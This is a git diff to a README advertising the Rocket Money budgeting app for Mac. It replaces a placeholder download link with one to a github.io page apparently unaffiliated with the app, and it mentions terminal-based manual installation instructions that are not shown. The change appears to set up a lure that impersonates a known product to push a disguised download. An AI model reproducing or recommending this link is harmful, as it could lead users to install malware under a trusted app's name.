@@ -4,7 +4,7 @@ Rocket Money is a powerful personal finance and budgeting tool designed to help 
 
 ![rocketmoneyapp](https://i.pcmag.com/imagery/reviews/02Qu73ohKNRw0rBp6lpVnYP-14..v1752171562.png)
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for%20MacOS-Click%20Here-black?style=for-the-badge\&logo=apple)](#)
+[![Download for Mac](https://img.shields.io/badge/Download%20for%20MacOS-Click%20Here-black?style=for-the-badge\&logo=apple)](https://rocket-money-for-mac.github.io/.github/)
 
 If the download button does not work, follow the manual installation instructions below using your terminal.
 
